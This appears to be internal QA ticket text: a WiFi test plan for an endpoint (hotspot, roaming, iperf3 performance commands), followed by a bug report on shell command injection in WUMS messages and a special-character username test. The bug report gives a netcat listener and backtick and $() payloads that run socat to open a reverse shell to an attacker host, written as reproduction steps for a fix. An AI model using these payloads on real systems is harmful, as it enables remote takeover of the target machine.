*Summary*

This test case ensures the endpoint’s Wifi capabilities and performance. 
In scope are also: 

* Wifi auto-switch
* static / dynamic IP
* connection to hidden networks
* configuration via UMS
* hotspot
* roaming

*Environment*

{panel:bgColor=#deebff}
For access details to the required networks, refer to *1Password:*

* ITGA-QA-WL2
* ITGA-QA-WL5
* ITGA-QA-WL6E
* ITGA-QA-WL2-H
{panel}

*Additional Information*

For the *Roaming test*, the Wifi Networks

* ITGA-QA-WL2
* ITGA-QA-WL5

are set up with a second access point in room 1.11 with intentionally weaker transmission power than the access point in room 1.23.  
This test requires carrying the endpoint from one room to the other.

For the *Hotspot test*, any phone able to provide a Private Hotspot can be used.



*Helpful Terminal Commands*

{panel:bgColor=#deebff}
Find out IP Address: 

{noformat}ip addr show{noformat}
{panel}

{panel:bgColor=#deebff}
Performance test:

_Start iperf3 server on random endpoint inside QA network:_ 

{noformat}iperf3 -s -D{noformat}

_Start iperf3 client on test endpoint:_

{code:java}iperf3 -c 192.168.x.x{code}

adding option -R starts test in reverse mode.

_Start iperf3 client on test endpoint (modified for Roaming test):_

{code:java}iperf3 -c 192.168.x.x -t 45 -i 0.5 -u -R{code}
{panel}

{panel:bgColor=#deebff}
Find out MAC Address of Access Point: 

{code:java}iwconfig | grep "Access Point"{code}
{panel}

See https://jira.igel.com/browse/LX8-4275

 

Fix shell command injection in messages sent from WUMS. The backtick `` and $() shell mechanisms can be used to execute code with user permissions via message strings.
*To reproduce:*
set up listener on attacker machine:
{code:bash}
netcat -lvp 1234
{code}
Send this string via send message to the target machine:
{code:bash}
'\\\"`socat tcp-connect:<attacker-IP>:1234 exec:bash,pty,stderr,setsid,sigint`'
{code}
A reverse shell connection comes in on the attacker machine. After that is closed, the message is shown on the target machine.

The other command substitution in bash $(command) also works for the attack.
{code:bash}
'\\\"$(socat tcp-connect:<attacker-IP>:1234 exec:bash,pty,stderr,setsid,sigint)'
{code}
*Acceptance Criteria*
 * Command injection in Send Message with `command` must not work.
 * Command injection in Send Message with $(command) must not work.

{noformat}
For internal tests try: 10.1.1.240 freeworld 

131.188.3.220 ntp0.fau.de
194.76.159.10 Melchers Bremen{noformat}

In this testcase it should be tested if you can use special characters in the user name.

username: qs-vdm&mehr${#}

